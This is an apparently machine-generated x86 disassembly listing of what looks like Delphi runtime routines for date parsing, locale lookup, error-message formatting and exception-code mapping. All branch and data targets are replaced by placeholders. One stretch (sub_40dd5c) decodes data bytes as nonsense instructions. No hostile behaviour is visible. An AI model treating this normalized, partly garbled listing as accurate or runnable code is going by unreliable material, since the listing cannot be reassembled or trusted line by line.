lea eax [ ebp - 0x1a ]
push eax
lea ecx [ ebp - 0x12 ]
mov edx ebx
mov eax esi
call sub_40c978
test al al
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_40cae4
test al al
je r-xdata
call sub_40bd48
mov edi eax
cmp [ ebp - 0xe ] 0x1
jne r-xdata
lea eax [ ebp - 0x1b ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
call sub_40c978
test al al
je r-xdata
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] ax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
jmp r-xdata
movzx eax [ ebp - 0xe ]
sub al 0x1
jb r-xdata
mov eax [ ebp - 0xc ]
push eax
movzx ecx [ ebp - 0x18 ]
movzx edx [ ebp - 0x16 ]
mov eax edi
call sub_40b998
mov [ ebp - 0xd ] al
mov edx [ rw-data ]
mov eax r-xdata
call sub_405b28
test eax eax
je r-xdata
mov edx ebx
movzx ecx [ rw-data ]
mov eax esi
call sub_40cae4
mov edx ebx
mov eax esi
call sub_40c954
cmp [ rw-data ] 0x0
je r-xdata
movzx edi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1b ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax ]
add al 0xd0
sub al 0xa
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
movzx edi [ ebp - 0x14 ]
movzx eax [ ebp - 0x1b ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_40580c
cmp eax [ ebx ]
jl r-xdata
mov edx ebx
mov eax esi
call sub_40cb6c
jmp r-xdata
cmp [ ebp - 0x1c ] 0x2
ja r-xdata
push ebp
movzx eax di
call sub_40cc08
pop ecx
mov edi eax
jmp r-xdata
movzx edi [ ebp - 0x10 ]
movzx eax [ ebp - 0x19 ]
mov [ ebp - 0x1c ] al
movzx eax [ ebp - 0x12 ]
mov [ ebp - 0x16 ] ax
movzx eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] ax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c954
mov eax esi
call sub_40580c
cmp eax [ ebx ]
jl r-xdata
mov eax [ ebx ]
cmp [ esi + eax - 0x1 ] 0x20
jne r-xdata
call sub_40bd48
movzx ecx ax
movzx eax [ rw-data ]
sub ecx eax
mov eax ecx
push ecx
mov ecx 0x64
cdq
idiv ecx
pop ecx
imul ax ax 0x64
add di ax
cmp [ rw-data ] 0x0
jbe r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ rw-data ]
call sub_40580c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_405a44
mov edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_409b18
test eax eax
je r-xdata
inc [ ebx ]
movzx eax di
cmp ecx eax
jle r-xdata
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
call sub_40580c
mov ecx eax
mov edx [ ebx ]
mov eax esi
call sub_405a44
mov edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_409b18
test eax eax
jne r-xdata
add di 0x64
jmp r-xdata
sub_40cfb0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov esi edx
mov ebp eax
xor ebx ebx
or edi 0xffffffff
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ca0c
test al al
jne r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ca0c
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ca0c
test al al
jne r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebp
call sub_40c978
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40c954
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ca0c
test al al
je r-xdata
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x6 ] 0x0
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xa ] 0x0
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_40cae4
test al al
je r-xdata
test edi edi
jge r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xa ]
mov edx esi
mov eax ebp
call sub_40c978
test al al
je r-xdata
test edi edi
jl r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ca0c
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_40cae4
test al al
je r-xdata
mov edx esi
mov eax ebp
call sub_40c954
movzx eax [ esp + 0xa ]
push eax
mov eax [ esp + 0x4 ]
push eax
movzx ecx [ esp + 0x10 ]
movzx edx [ esp + 0xe ]
movzx eax [ esp + 0xc ]
call sub_40b850
mov ebx eax
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor edi edi
jmp r-xdata
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ca0c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xc ]
mov edx esi
mov eax ebp
call sub_40c978
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
ja r-xdata
mov edx esi
mov ecx [ rw-data ]
mov eax ebp
call sub_40ca0c
test al al
jne r-xdata
mov edx esi
movzx ecx [ rw-data ]
mov eax ebp
call sub_40cae4
test al al
je r-xdata
cmp [ esp + 0x4 ] 0xc
jne r-xdata
mov edi 0xc
mov edx esi
mov ecx r-xdata
mov eax ebp
call sub_40ca0c
test al al
je r-xdata
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0xe ]
mov edx esi
mov eax ebp
call sub_40c978
test al al
je r-xdata
add [ esp + 0x4 ] di
mov [ esp + 0x4 ] 0x0
sub_40d1a8
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40cc64
test al al
je r-xdata
xor eax eax
mov eax ebx
test eax eax
je r-xdata
cmp eax [ esp ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop esi
pop ebx
retn
sub_40d1e0
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
mov ecx esi
mov edx esp
mov eax ebx
call sub_40cfb0
test al al
je r-xdata
xor eax eax
mov eax ebx
test eax eax
je r-xdata
cmp eax [ esp ]
setl al
jmp r-xdata
sub eax 0x4
mov eax [ eax ]
pop edx
pop esi
pop ebx
retn
sub_40d218
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_40d24c
test al al
jne r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
mov [ esp + 0x8 ] ebx
mov [ esp + 0xc ] 0xb
lea edx [ esp + 0x8 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_40976c
sub_40d24c
push ebx
push esi
push edi
add esp 0xffffffe8
mov edi edx
mov esi eax
mov bl 0x1
mov [ esp ] 0x1
xor eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax esi
call sub_40cc64
test al al
jne r-xdata
mov eax esi
test eax eax
je r-xdata
mov al 0x1
jmp r-xdata
cmp eax [ esp ]
jge r-xdata
sub eax 0x4
mov eax [ eax ]
test al al
je r-xdata
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax esi
call sub_40cfb0
mov al 0x1
jmp r-xdata
fld [ esp + 0x8 ]
fcomp [ r-xdata ]
fwait
fnstsw ax
sahf
jb r-xdata
mov edx edi
mov eax esi
call sub_40d1e0
mov ebx eax
jmp r-xdata
xor al 0x1
fld [ esp + 0x8 ]
fsub [ esp + 0x10 ]
fstp [ edi ]
fwait
fld [ esp + 0x8 ]
fadd [ esp + 0x10 ]
fstp [ edi ]
fwait
jmp r-xdata
mov eax ebx
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_40d2e8
push ebx
add esp 0xffffff00
mov ebx edx
push 0x0
push 0x100
lea edx [ esp + 0x8 ]
push edx
push 0x0
push eax
push 0x0
push 0x3200
call FormatMessageA
jmp r-xdata
test eax eax
jle r-xdata
mov edx esp
mov ecx ebx
xchg ecx eax
call sub_405620
add esp 0x100
pop ebx
retn
movzx edx [ esp + eax - 0x1 ]
sub dl 0x21
jb r-xdata
dec eax
sub dl 0xd
je r-xdata
sub_40d334
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov esi ecx
mov ebx [ ebp + 0x8 ]
push 0x100
lea ecx [ ebp - 0x100 ]
push ecx
push edx
push eax
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
mov edx esi
call sub_405584
mov ecx eax
dec ecx
lea edx [ ebp - 0x100 ]
mov eax ebx
call sub_405620
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_40d380
push ebx
push esi
push edi
push ecx
mov ebx ecx
mov esi edx
mov edi eax
push 0x2
lea eax [ esp + 0x4 ]
push eax
push esi
push edi
call GetLocaleInfoA
test eax eax
jle r-xdata
mov eax ebx
movzx eax [ esp ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40d3ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx esi
call sub_40d334
cmp [ ebx ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx ebx
call sub_407550
sub_40d3e8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_40d4fb
push [ fs : eax ]
mov [ fs : eax ] esp
call GetThreadLocale
mov [ ebp - 0x4 ] eax
mov ebx 0x1
mov esi rw-data
mov edi rw-data
push ebp
push 0xb
lea eax [ ebp - 0xc ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x44 ]
dec eax
call sub_40d3ac
pop ecx
mov edx [ ebp - 0xc ]
mov eax esi
call sub_405584
push ebp
push 0xb
lea eax [ ebp - 0x10 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
lea eax [ ebx + 0x38 ]
dec eax
call sub_40d3ac
pop ecx
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_405584
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0xd
jne r-xdata
mov ebx 0x1
mov esi rw-data
mov edi rw-data
lea eax [ ebx + 0x5 ]
mov ecx 0x7
cdq
idiv ecx
mov [ ebp - 0x8 ] edx
push ebp
push 0x6
lea eax [ ebp - 0x14 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x31
call sub_40d3ac
pop ecx
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_405584
push ebp
push 0x6
lea eax [ ebp - 0x18 ]
push eax
mov ecx rw-data
mov edx ebx
dec edx
mov eax [ ebp - 0x8 ]
add eax 0x2a
call sub_40d3ac
pop ecx
mov edx [ ebp - 0x18 ]
mov eax edi
call sub_405584
inc ebx
add edi 0x4
add esi 0x4
cmp ebx 0x8
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d502
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_405554
retn
sub_40d50c
push ebp
mov ebp esp
push ebx
push esi
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0x0
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebx * 4 + rw-data ]
mov edx [ ebp + 0x8 ]
call sub_405728
mov esi 0x1
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
inc ebx
sub_40d548
push ebp
mov ebp esp
push 0x0
push ebx
push esi
xor eax eax
push ebp
push sub_40d5ad
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
mov ebx 0x1
jmp r-xdata
cmp [ ebx * 4 + rw-data ] 0xffffffff
jne r-xdata
cmp ebx 0x7
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_405728
mov eax [ ebp - 0x4 ]
xor edx edx
call sub_409f18
mov [ ebx * 4 + rw-data ] eax
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5b4
lea eax [ ebp - 0x4 ]
call sub_405530
retn
inc ebx
sub_40d5c0
push ebp
mov ebp esp
push 0x0
push esi
xor eax eax
push ebp
push sub_40d657
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x100b
call sub_40d334
mov eax [ ebp - 0x4 ]
mov edx 0x1
call sub_409f18
mov esi eax
mov eax esi
add eax 0xfffffffd
sub eax 0x3
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d65e
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x4
push esi
call GetThreadLocale
push eax
push sub_40d50c
call EnumCalendarInfoA
mov edx 0x7
mov eax rw-data
mov [ eax ] 0xffffffff
add eax 0x4
dec edx
jne r-xdata
push 0x3
push esi
call GetThreadLocale
push eax
push sub_40d548
call EnumCalendarInfoA
sub_40d670
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_40d840
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx 0x1
mov eax edi
call sub_405530
lea eax [ ebp - 0x8 ]
push eax
call GetThreadLocale
mov ecx r-xdata
mov edx 0x1009
call sub_40d334
mov eax [ ebp - 0x8 ]
mov edx 0x1
call sub_409f18
add eax 0xfffffffd
sub eax 0x3
jb r-xdata
mov eax esi
call sub_40580c
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
sub eax 0x4
je r-xdata
movzx eax [ esi + ebx - 0x1 ]
movzx eax al
bt [ rw-data ] eax
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d847
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_405554
retn
mov al 0x1
add eax 0xfffffff3
sub eax 0x2
jb r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40a9fc
test eax eax
jne r-xdata
mov edx ebx
mov eax esi
call sub_40e778
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax esi
call sub_405a44
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_405818
add ebx [ ebp - 0x4 ]
jmp r-xdata
mov eax edi
mov edx esi
call sub_405584
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x4
call sub_40a9fc
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_405818
inc ebx
jmp r-xdata
mov eax esi
call sub_40580c
cmp ebx eax
jle r-xdata
test al al
je r-xdata
mov edx r-xdata
lea eax [ esi + ebx - 0x1 ]
mov ecx 0x2
call sub_40a9fc
test eax eax
jne r-xdata
mov eax edi
mov edx r-xdata
call sub_405818
add ebx 0x3
jmp r-xdata
inc ebx
movzx eax [ esi + ebx - 0x1 ]
sub al 0x47
je r-xdata
jmp r-xdata
movzx eax [ esi + ebx - 0x1 ]
sub al 0x59
je r-xdata
mov eax edi
mov edx r-xdata
call sub_405818
inc ebx
jmp r-xdata
inc ebx
sub al 0x20
je r-xdata
mov eax edi
mov edx r-xdata
call sub_405818
jmp r-xdata
sub al 0x20
jne r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ esi + ebx - 0x1 ]
call sub_405718
mov edx [ ebp - 0xc ]
mov eax edi
call sub_405818
lea eax [ ebp - 0x14 ]
movzx edx [ esi + ebx - 0x1 ]
call sub_405718
mov edx [ ebp - 0x14 ]
mov eax edi
call sub_405818
sub_40d8ac
push ebp
mov ebp esp
add esp 0xfffffba8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
push 0x1c
lea eax [ ebp - 0x330 ]
push eax
push ebx
call VirtualQuery
cmp [ ebp - 0x320 ] 0x1000
jne r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ rw-data ]
push eax
call GetModuleFileNameA
mov eax ebx
call sub_40d8a0
mov [ ebp - 0x8 ] eax
jmp r-xdata
push 0x105
lea eax [ ebp - 0x212 ]
push eax
mov eax [ ebp - 0x32c ]
push eax
call GetModuleFileNameA
test eax eax
jne r-xdata
lea eax [ ebp - 0x212 ]
mov dl 0x5c
call sub_40ea38
mov edx eax
inc edx
lea eax [ ebp - 0x10d ]
mov ecx 0x104
call sub_40a8f4
mov ebx r-xdata
mov edi r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
sub ebx [ ebp - 0x32c ]
mov [ ebp - 0x8 ] ebx
push 0x100
lea eax [ ebp - 0x312 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_406a10
push eax
call LoadStringA
lea edx [ ebp - 0x458 ]
mov eax [ esi ]
call sub_404530
lea eax [ ebp - 0x458 ]
mov [ ebp - 0x358 ] eax
mov [ ebp - 0x354 ] 0x4
lea eax [ ebp - 0x10d ]
mov [ ebp - 0x350 ] eax
mov [ ebp - 0x34c ] 0x6
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x348 ] eax
mov [ ebp - 0x344 ] 0x5
mov [ ebp - 0x340 ] ebx
mov [ ebp - 0x33c ] 0x6
mov [ ebp - 0x338 ] edi
mov [ ebp - 0x334 ] 0x6
lea eax [ ebp - 0x358 ]
push eax
push 0x4
lea ecx [ ebp - 0x312 ]
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40af58
mov eax [ ebp - 0x4 ]
call sub_40a868
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0x4 ]
call sub_4059dc
mov ebx eax
mov eax ebx
call sub_40a868
test eax eax
je r-xdata
cmp [ ebx + eax - 0x1 ] 0x2e
je r-xdata
mov edi r-xdata
sub_40da34
add esp 0xfffffbbc
push 0x400
lea ecx [ esp + 0x48 ]
call sub_40d8ac
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x40
lea eax [ esp + 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
call sub_406a10
push eax
call LoadStringA
push 0x2010
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push 0x0
call MessageBoxA
mov eax [ rw-data ]
call sub_403820
call sub_40305c
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x48 ]
push eax
call CharToOemA
push 0x0
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4c ]
call sub_40a868
push eax
lea eax [ esp + 0x50 ]
push eax
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff4
call GetStdHandle
push eax
call WriteFile
jmp r-xdata
add esp 0x444
retn
sub_40dafc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405584
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_40db38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40db92
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_40af98
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db99
lea eax [ ebp - 0x4 ]
call sub_405530
retn
add esp 0xfffffff0
call sub_404974
sub_40db99
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_40dbb8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ edi + 0x4 ]
mov eax esi
call sub_407550
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_40dbf4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_40dc60
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_407550
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40af98
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc67
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
add esp 0xfffffff0
call sub_404974
sub_40dc67
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_40dc88
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405584
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_40dcfc
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_4030dc
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dafc
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40dd5c
pushad
fld [ eax ]
push cs
or dl [ ebp + eax * 2 + 0x78 ]
arpl [ ebp + 0x70 ] sp
je r-xdata
cmp al 0xff
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
push ebx
mov eax edx
jmp sub_404ec4
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
movzx eax al
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40dafc
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40dcfc
mov edx eax
sub_40ddcc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40de68
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4055c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de6f
lea eax [ ebp - 0x20 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_40debc
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40df54
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40e10f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_407550
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4057a0
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_40a68c
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e116
lea eax [ ebp - 0x170 ]
call sub_405530
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_40e120
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40e1d9
